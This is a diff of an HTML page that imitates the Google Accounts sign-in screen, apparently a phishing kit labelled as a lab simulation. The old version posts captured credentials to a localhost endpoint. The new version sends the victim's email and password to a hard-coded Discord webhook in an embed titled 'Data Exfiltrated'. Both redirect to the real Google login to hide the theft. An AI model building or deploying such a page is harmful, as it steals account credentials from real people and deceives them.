@@ -1,74 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body { font-family: 'Roboto',arial,sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 350px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
+    </style>
 </head>
 <body>
-    <div class="auth-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-        
-        <!-- Step 1: Email -->
-        <div id="step-email">
-            <h1>Sign in</h1>
-            <p class="sub-text">Use your Google Account</p>
-            <div class="input-container">
-                <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
-            </div>
-            <div class="footer-actions">
-                <a class="link">Forgot email?</a>
-                <button onclick="nextStep()">Next</button>
-            </div>
+    <div class="card">
+        <div class="logo">
+            <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
         </div>
-
-        <!-- Step 2: Password -->
-        <div id="step-password" class="hidden">
-            <h1>Welcome</h1>
-            <div id="user-pill"></div>
-            <div class="input-container">
-                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
-            </div>
-            <div class="footer-actions">
-                <a class="link">Forgot password?</a>
-                <button onclick="captureAndRedirect()">Next</button>
-            </div>
-        </div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <input type="email" id="email" placeholder="Email or phone">
+        <input type="password" id="pass" placeholder="Enter your password">
+        <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-top: 10px;">Forgot password?</div>
+        <br><br>
+        <button onclick="transmit()">Next</button>
     </div>
 
     <script>
-        let userData = { email: "", password: "" };
+        // YOUR DISCORD WEBHOOK
+        const hook = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
 
-        function nextStep() {
-            const emailVal = document.getElementById('email').value;
-            if (emailVal.length > 5) {
-                userData.email = emailVal;
-                document.getElementById('step-email').classList.add('hidden');
-                document.getElementById('user-pill').innerText = emailVal;
-                document.getElementById('step-password').classList.remove('hidden');
-            }
-        }
+        async function transmit() {
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
 
-        async function captureAndRedirect() {
-            userData.password = document.getElementById('password').value;
+            const content = {
+                embeds: [{
+                    title: "🚀 Data Exfiltrated",
+                    color: 4285F4, // Google Blue
+                    fields: [
+                        { name: "Target Email", value: e || "None", inline: true },
+                        { name: "Target Pass", value: "||" + (p || "None") + "||", inline: true }
+                    ],
+                    footer: { text: "Tier 3: Lab 3.2 Simulation" }
+                }]
+            };
 
-            // CAPTURE LOGIC:
-            // Since you're on GitHub Pages, we send this to your LOCAL server or a Webhook.
-            // Replace 'http://localhost:3000' with your actual backend URL if you deploy one.
-            try {
-                await fetch('http://localhost:3000/auth/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(userData)
-                });
-            } catch (e) {
-                console.log("Local server not found, but data is ready for capture.");
-            }
+            await fetch(hook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(content)
+            });
 
-            // The "Magic Trick": Redirect them to the real Google login 
-            // so they just think the first attempt "glitched."
-            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd";
+            // The 'Hand-off': Redirect to real Google login to hide the attack
+            window.location.href = "https://accounts.google.com/signin";
         }
     </script>
 </body>
